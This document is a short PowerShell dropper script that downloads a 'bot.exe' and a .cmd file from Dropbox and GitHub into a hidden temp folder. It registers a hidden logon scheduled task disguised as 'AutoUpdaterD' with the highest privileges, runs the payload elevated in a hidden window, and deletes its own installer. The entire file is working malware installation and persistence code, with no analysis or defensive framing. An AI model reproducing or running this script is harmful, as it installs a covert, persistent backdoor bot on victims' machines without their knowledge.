#sets location
cd $env:temp

#make new folder
mkdir sVBXKuz

#cd into folder
cd sVBXKuz

#download executable and startup file
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/rgj5n9whyfnzl4k/bot.exe?dl=0" -OutFile wsappa.exe
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/1.cmd" -OutFile uesFNz8Ds9KS.cmd


#hide files
$file = "$env:temp\sVBXKuz\wsappa.exe"
$file2 = "$env:temp\sVBXKuz\uesFNz8Ds9KS.cmd"


$attr = [System.IO.FileAttributes]::Hidden

# Hide first file
Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attributes -bor $attr)

# Hide second file
Set-ItemProperty -Path $file2 -Name Attributes -Value ((Get-Item $file2).Attributes -bor $attr)

$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\uesFNz8Ds9KS.cmd'
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10


#create startup task
$taskXml = @"
<Task version="1.6" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-05-23T00:00:00.000Z</Date>
    <Author>DOMAIN\$env:UserName</Author>
    <URI>\AutoUpdaterD</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>DOMAIN\$env:UserName</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$env:temp\sVBXKuz\uesFNz8Ds9KS.cmd</Command>
    </Exec>
  </Actions>
</Task>
"@

$taskXml = $taskXml.Replace("DOMAIN\$env:UserName", "$env:USERDOMAIN\$env:UserName")

Register-ScheduledTask -Xml $taskXml -TaskName 'AutoUpdaterD' -Force

#start bot
cd $env:temp\sVBXKuz; start-process uesFNz8Ds9KS.cmd -Verb runAs -WindowStyle Hidden

#clean up
powershell.exe /c Remove-Item dinstall.ps1

#exit
exit